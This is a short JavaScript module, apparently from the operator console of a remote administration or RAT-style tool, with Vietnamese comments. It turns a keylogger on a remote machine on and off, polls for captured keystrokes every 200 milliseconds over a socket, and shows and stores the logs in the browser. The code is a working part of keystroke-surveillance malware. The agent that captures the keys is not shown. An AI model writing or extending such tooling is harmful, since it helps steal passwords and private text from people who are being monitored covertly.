// modules/tab-keylog.js
import { store } from "./store.js";
import { sendCommand } from "./socket.js";
import { logActionUI } from "./ui.js";

// Ham xu ly khi nhan du lieu 'GET_KEYLOG'
export function handleKeylogData(payload) {
  const chk = document.getElementById("chkKeylog");
  if (chk) chk.checked = payload.enabled;

  if (payload.log) {
    let area = document.getElementById("logArea");
    area.value += payload.log;
    area.scrollTop = area.scrollHeight;
    sessionStorage.setItem("keylogs", area.value);
  }
}

// --- MOI: Ham nay duoc goi khi chuyen tab ---
export function loadKeylog() {
  sendCommand("GET_KEYLOG");
}

export function toggleKeylog(cb) {
  sendCommand("KEYLOG_SET", cb.checked); // Gui lenh
  logActionUI(`Keylog: ${cb.checked ? "BẬT" : "TẮT"}`, true);

  if (cb.checked) {
    if (!store.keylogInt)
      store.keylogInt = setInterval(() => {
        sendCommand("GET_KEYLOG"); // Lien tuc hoi log moi
      }, 200);
  } else {
    if (store.keylogInt) {
      clearInterval(store.keylogInt);
      store.keylogInt = null;
    }
  }
}

export function clearLogs() {
  if (confirm("Xóa log? (Chỉ xóa ở trình duyệt)")) {
    document.getElementById("logArea").value = "";
    sessionStorage.removeItem("keylogs");
    logActionUI("Đã xóa log phím (phía client)", true);
  }
}
